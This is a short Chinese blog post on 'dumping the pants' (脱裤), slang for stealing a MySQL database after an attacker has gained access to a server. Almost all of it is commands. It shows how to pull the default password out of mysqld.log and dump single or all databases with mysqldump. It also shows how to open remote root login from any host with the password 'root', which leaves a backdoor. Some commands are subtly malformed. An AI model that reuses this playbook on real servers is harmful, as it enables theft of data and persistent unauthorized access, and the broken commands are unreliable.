---
layout: post
title: mysql：脱裤操作
date: 2019-12-20
categories: blog
tags: [mysql，脱裤]
description: mysql，脱裤
---

#### 一、环境
- 在获取服务器权限之后，一般要获取的数据除了网站源码，还有数据库文件，这样可以本地搭建相同的环境，分析出更多的漏洞或重要数据

#### 二、脱裤常用命令
- 查看mysql默认密码
`grep "password" /var/log/mysqld.log`
- 脱某个数据库
`mysqldump -hhostname -uusername -ppassword 数据库名称 > backupfile.sql`
- 脱某个数据库并直接压缩
`mysqldump -hhostname -uusername -ppassword 数据库名称 | gzip > backupfile.sql.gz`
- 只备份某个或多个表(有的整个数据库很大，整个下载流量很大)
`mysqldump -hhostname -uusername -ppassword databasename specific_table1 specific_table2 > backupfile.sql`
- 同时备份多个数据库（需要压缩同上）
`mysqldump -hhostname -uusername -ppassword –databases databasename1 databasename2 databasename3 > multibackupfile.sql`
- 备份服务器上所有数据库
`mysqldump –all-databases > allbackupfile.sql`
- 只备份数据库的库表字段结构
`mysqldump –no-data –databases databasename1 databasename2 databasename3 > structurebackupfile.sql`

#### 三、恢复脱下的裤
```mysql
mysql -uroot -proot
create test123;
use test123;
source /root/test123.sql;导入数据库文件
```
#### 四、navivat远程连接脱裤
- 在服务器上管理员权限通过以下命令开启mysql远程登录（默认是关闭的）
```nysql
mysql -uroot -proot
use mysql;

将host字段的值改为%就表示在任何客户端机器上能以root用户登录到mysql服务器
update user set Host = '%' where Host = 'localhost' and User='root';
flush privileges;

或者使用 grant 命令重新创建一个用户root root
GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'root';
flush privileges;
```

#### 五、注意事项
- 当出现 10038错误时 2003 - Can't content to MySQL server on '127.0.0.1' (10038)，可能原因是
1、未开启远程登录或不允许该账号登录
2、防火墙屏蔽3306














